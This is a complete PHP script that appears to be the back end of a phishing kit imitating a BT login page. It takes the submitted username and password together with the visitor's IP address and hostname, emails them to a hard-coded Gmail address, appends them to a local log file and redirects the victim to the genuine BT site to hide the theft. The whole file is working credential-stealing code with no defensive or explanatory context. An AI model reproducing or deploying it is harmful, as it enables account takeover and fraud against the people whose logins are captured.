<?
$to = "celestialcb1987@gmail.com";
//--------------------------------
$USER = $_POST['USER'];
$PASSWORD = $_POST['PASSWORD'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "|| BT ||";
$msg = "Email or username: $USER\nPassword: $PASSWORD\nHost : $host\nIP : $ip";
$from = "FROM: King-BraIn™<webmaster@info.com>";	
			{
		mail($to,$subj,$msg,$from);
		file_put_contents("logs.txt",$msg,FILE_APPEND);
				}
			header("location: http://home.bt.com");
?>
